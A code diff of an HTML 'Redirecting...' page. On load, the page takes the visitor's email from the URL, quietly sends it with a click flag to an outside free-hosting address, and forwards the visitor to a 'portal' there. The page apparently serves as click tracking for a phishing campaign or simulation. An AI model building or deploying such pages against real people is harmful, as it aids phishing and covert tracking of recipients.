@@ -4,14 +4,22 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
-        const email = new URLSearchParams(window.location.search).get('email');
+        // URL se email parameter nikalna
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        
         if (email) {
-            navigator.sendBeacon('https://resolven.infinityfree.io/update_click.php', JSON.stringify({ email: email, clicked: 'Yes' }));
+            // Background mein InfinityFree index.php ko hit karke status update karwana
+            fetch('https://resolven.infinityfree.io/?email=' + encodeURIComponent(email), {
+                mode: 'no-cors'
+            }).catch(e => {});
         }
-        window.location.replace("https://resolven.infinityfree.io");
+
+        // Turant main portal / index.php par redirect karna
+        window.location.replace("https://resolven.infinityfree.io/?email=" + encodeURIComponent(email || ''));
     </script>
 </head>
 <body>
-    <p>Redirecting... <a href="https://resolven.infinityfree.io">Click here if not redirected</a>.</p>
+    <p>Redirecting to portal... <a href="https://resolven.infinityfree.io">Click here if not redirected</a>.</p>
 </body>
 </html>
